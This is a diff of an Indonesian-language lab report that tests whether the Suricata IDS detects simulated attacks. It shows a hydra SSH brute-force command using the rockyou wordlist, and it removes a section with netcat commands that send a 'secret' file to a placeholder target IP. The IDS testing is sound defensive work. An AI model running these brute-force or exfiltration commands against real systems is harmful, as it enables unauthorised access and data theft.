@@ -75,16 +75,6 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.20.30.10
 ```
 Suricata berhasil mendeteksi aktivitas brute force terhadap layanan SSH dan menampilkan alert terkait upaya login berulang. Hal ini membuktikan IDS mampu mengidentifikasi perilaku autentikasi yang mencurigakan.
 
-d. Data Exfiltration (Transfer File Besar via Netcat)
-Receiver:
-```
-nc -lvp 4444 > file_terima.txt
-```
-Sender:
-```
-nc <IP_TARGET> 4444 < file_rahasia.txt
-```
-Suricata menampilkan alert terkait transfer data dalam jumlah besar, menunjukkan bahwa IDS mampu mengidentifikasi pola exfiltration sederhana melalui kanal TCP biasa.
 ## Analisis Singkat
 
 **Serangan Yang Paling Mudah Terdeteksi**
